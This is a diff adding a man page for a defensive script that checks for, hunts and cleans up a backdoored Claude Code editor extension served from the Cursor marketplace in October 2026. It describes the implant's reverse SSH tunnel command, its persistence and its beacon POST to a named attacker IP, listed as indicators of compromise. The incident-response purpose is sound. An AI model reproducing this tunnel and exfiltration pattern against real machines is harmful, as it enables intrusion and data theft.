@@ -1,0 +1,218 @@
+.TH PSF-CLAUDE-CODE-VSX-OCT2026-CHECK 8 "30 October 2026" "psf-security-patches 26.10.30-1.0.0" "System Administration"
+.ad l
+.SH NAME
+.ad l
+psf-claude-code-vsx-oct2026-check \- Claude Code extension SSH backdoor (Cursor marketplace, 29 October 2026): check, hunt, update, keys, clean
+.SH SYNOPSIS
+.ad l
+\fB/\:\:opt/\:\:psf\-security\-patches/\:\:claude\-code\-vsx/\:\:claude\-code\-vsx\-oct2026\-check.sh\fR [command] [options]
+.SH DESCRIPTION
+.ad l
+.PP
+No CVE (supply-chain compromise of an editor extension)
+.PP
+Cursor reports that between about 2:27am and 1:35pm Pacific time on 29 October
+2026 a maliciously modified copy of the Claude Code extension for VS Code
+(versions 2.1.312 and 2.1.313) was served from the Cursor extension
+marketplace, to up to 5,000 developer machines. Anthropic says it was not
+involved in building, publishing or hosting the tampered build. A prefix added
+to extension.js runs the moment the editor loads the extension. It:
+.RS 2
+.nf
+\- appends the attacker's ed25519 key (comment "svc-telemetry") to
+  ~/.ssh/authorized_keys;
+\- writes ~/.config/.smt (a retry loop) and ~/.config/.smtk (the
+  tunnel key),
+  and a copy of the tunnel key as .stk_<10 hex> in the temp
+    directory;
+\- opens a reverse SSH tunnel (ssh \-N \-R '*:0:localhost:22') to
+  tunnel@134.209.82.225 and retries it about every 60 seconds,
+    kept alive
+  across reboots by a LaunchAgent (~/Library/LaunchAgents/
+  com.apple.sysmond.plist) on macOS or an @reboot crontab entry on
+    GNU/Linux
+  (a scheduled task named SysMon on Windows);
+\- tries to switch the local SSH server on (this fails without
+  admin rights
+  on most machines, so the inbound path is often closed, but the
+    key and
+  the persistence are still planted);
+\- POSTs the hostname, user name, OS, public IP, git email and the
+  NAMES of
+  environment variables that look like secrets (not their values)
+    to
+  http://134.209.82.225:8099/beacon.
+.fi
+.RE
+.PP
+Cursor says it has had the attacker's server taken offline. Treat that as a
+reason the damage may be smaller, not as a reason to skip the cleanup.
+.PP
+Updating or uninstalling the extension does NOT remove any of that. A
+replacement build, 2.1.314, was published on 30 October; it swaps the
+extension's files and leaves the key, the scripts and the persistence in
+place. This script checks for each piece separately.
+.PP
+One detail matters when judging versions: a legitimate 2.1.312 exists (it is
+on npm and Open VSX, published 27 October). Only the copy served by Cursor's
+marketplace was modified. So 2.1.312 is judged by the content of its
+extension.js, not by its number. 2.1.313 was never published legitimately
+anywhere and is reported on sight.
+.PP
+Get the vendor's fix FIRST, then clean. Anthropic replaced the bad build with
+Claude Code 2.1.314 (published 30 October 2026); 2.1.314 or newer is the fix. Every
+run of check, hunt, clean and update says so up front. The "update" command below
+installs it through your editor, but only after it shows you the state of the
+machine and asks. Installing the fix is half of the job: it does not remove an
+SSH key, implant files or persistence that already got planted.
+.SH COMMANDS AND OPTIONS
+.ad l
+.TP
+\fBcheck (default)\fR
+.ad l
+read-only. Looks for: an installed Claude Code extension
+that is 2.1.313 or carries the backdoored extension.js
+(known SHA-256, the C2 address or the svc-telemetry key
+comment); a downloaded or cached extension package with a
+known bad hash; the attacker's key in authorized_keys
+(matched by key, by fingerprint and by comment), with an
+inventory of every other key so an unknown one stands out;
+the implant files; the crontab entry or LaunchAgent;
+running tunnel processes; a connection to the C2; and
+whether this machine's SSH server is reachable on the
+loopback address, which is the door the tunnel opens.
+Exit 0 = nothing found, 1 = exposure or compromise found,
+2 = could not read what it needed to.
+.TP
+\fBhunt\fR
+.ad l
+read-only. Searches the SSH server logs for a login with
+the attacker's key (a login through the tunnel arrives
+from 127.0.0.1 or ::1), and lists recent changes under
+~/.ssh, ~/.config and the LaunchAgents folder for review.
+Exit 0 = no login evidence, 1 = evidence found.
+.TP
+\fBupdate\fR
+.ad l
+the vendor's fix, with questions first. (1) a read-only check, as
+above. (2) for each editor command line (code, cursor, codium,
+windsurf) whose extensions folder holds Claude Code, it shows the
+command it would run (<editor> \-\-install\-extension
+anthropic.claude-code \-\-force; the editor downloads the extension
+from its own marketplace, this script downloads nothing) and asks
+before running it. An editor that does not have the extension is
+not offered one. (3) it checks again, says whether Claude Code
+2.1.314 or newer is now installed, and, if the machine shows the
+backdoor, asks whether to run 'clean' now. It needs a terminal to
+ask on, or \-\-yes (install without asking). \-\-yes never answers the
+clean question: that needs an answer at the terminal, or \-\-and\-clean. As root it checks and cleans but does not
+install, because editors are per user. Close the editor first.
+\-\-dry\-run shows the commands and runs none.
+.TP
+\fBkeys\fR
+.ad l
+read-only. Lists the private keys in each account's ~/.ssh with
+their type, fingerprint, last change and whether a passphrase
+protects the file, and counts the agent sockets in ~/.ssh/agent.
+It prints no key material. A private key file that no passphrase
+protects can be used by anything that can read it, which is what
+a file-reading flaw in an editor or assistant gets; keys loaded in
+an ssh-agent are not in those files. OpenSSH 10.1 and later keep
+the agent's socket in ~/.ssh/agent (older versions use /tmp):
+that folder holds sockets, not keys, so there is nothing in it to
+block. Exit 0, or 2 if something could not be read.
+.TP
+\fBclean\fR
+.ad l
+containment and cleanup. Stops the tunnel processes,
+unloads and removes the persistence, removes the
+attacker's key line from authorized_keys, and moves the
+implant files and the bad extension folders into a
+backup folder (nothing is deleted). Add \-\-reinstall to
+install the extension again through any editor command
+line it finds (code, cursor, codium, windsurf). Close the
+editor first. Re-checks afterwards and exits 1 if anything
+remains. \-\-dry\-run shows what it would do. Before it changes anything
+it keeps a record of each account's ~/.ssh in the backup folder:
+authorized_keys, config and known_hosts with their times, an
+inventory of the private keys (no key material), and the names of
+the agent sockets. \-\-copy\-keys also copies the private key files
+into the backup folder (0600), which is one more copy of a secret:
+delete it once you have rotated the keys. \-\-drop\-agent\-keys empties
+the ssh-agents that belong to you (ssh-add \-D) after the record is
+kept; the keys must be added again afterwards. It is not a cure:
+it does not help against key files that were already copied.
+.TP
+\fBblock\fR
+.ad l
+GNU/Linux, as root: drop outbound traffic to the C2
+address with nftables or iptables. Defense in depth only;
+rules do not survive a reboot. On macOS it prints how to
+do the same. \-\-dry\-run shows the command.
+.TP
+\fBunblock\fR
+.ad l
+remove the rule that block added.
+.TP
+\fBversion\fR
+.ad l
+print the script version.
+.PP
+Options: \-\-dry\-run (clean, block, unblock, update)   \-\-reinstall (clean)   \-\-yes, \-\-and\-clean (update)
+.RS 2
+.PP
+\-\-copy\-keys, \-\-drop\-agent\-keys (clean, and the clean step of update)
+.RE
+.PP
+Run it as your own user to check your own account. Run it as root to check
+every account on the machine. It works on GNU/Linux and macOS. It does not
+cover Windows: use the remediation script in Cursor's notice there.
+.PP
+Env overrides:
+.RS 2
+.nf
+NO_NOTICE=1                       leave out the upfront notice about the vendor's fix
+ANSWERS_FILE=/path                answers for update, one per line (y or n), read
+                                  instead of the terminal (for
+                                    automation)
+HOMES="/home/a:/home/b"           accounts to check, colon separated (default:
+                                  you; as root: every account)
+BACKUP_ROOT=/\:var/\:backups/\:claude\-code\-vsx\-oct2026   where clean puts files
+                                  (default for a normal user:
+                                  ~/claude\-code\-vsx\-oct2026\-backup)
+TMP_DIRS="/tmp:/var/tmp"          where to look for .stk_ key copies (colon separated)
+EXT_ROOTS_EXTRA="/opt/ide/extensions"   more folders that hold extensions (colon separated)
+EXTRA_KEY_BLOBS, EXTRA_FPRS, EXTRA_SHA256   more indicators, space separated,
+                                  for when the vendors publish
+                                    updates
+HUNT_LOGS="/var/log/ssh/*.log"    extra log files for hunt
+HUNT_LOG_DAYS=4                   how many days of macOS log to search
+LOOPBACK_PORT=22                  port to probe on 127.0.0.1
+PLATFORM=Linux|Darwin             override the detected platform
+.fi
+.RE
+.SH FILES
+.ad l
+.TP
+\fB/\:\:opt/\:\:psf\-security\-patches/\:\:claude\-code\-vsx/\:\:claude\-code\-vsx\-oct2026\-check.sh\fR
+.ad l
+The script.
+.SH SEE ALSO
+.ad l
+psf\-security\-patches(7).
+.PP
+https:/\:/\:codeberg.org/\:PrivacySafe/\:security\-patches
+.br
+Documentation: https://privacysafe.app/docs/security-patches/
+.br
+PrivacySafe: https://privacysafe.app
+.SH AUTHORS
+.ad l
+Written and published by PrivacySafe Foundation, a 501(c)(3) nonprofit, with the assistance of Ivy Cyber LLC.
+.PP
+AI assistance in this script: Claude Sonnet 5.5 (the Assisted-by line in the script header).
+.SH COPYRIGHT
+.ad l
+CC0 1.0 Universal. To the extent possible under law, Ivy Cyber LLC has waived all copyright and related or neighboring rights to PrivacySafe Security Patches, including its software and documentation. CC0 does not waive trademark or patent rights.
+.PP
+If this software is helpful, please consider supporting PrivacySafe Foundation: https://privacysafe.foundation
